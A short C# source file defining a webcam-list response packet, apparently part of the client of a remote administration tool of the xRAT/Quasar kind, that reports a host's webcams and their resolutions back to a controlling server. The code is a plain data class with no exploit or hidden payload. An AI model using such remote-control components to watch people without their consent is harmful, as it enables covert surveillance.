using System;
using System.Collections.Generic;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets
{
    [Serializable]
    public class GetWebcamsResponse : IPacket
    {
        public Dictionary<string, List<int>> Webcams { get; set; }

        public GetWebcamsResponse()
        {
        }

        public GetWebcamsResponse(Dictionary<string, List<int>> webcams)
        {
            this.Webcams = webcams;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}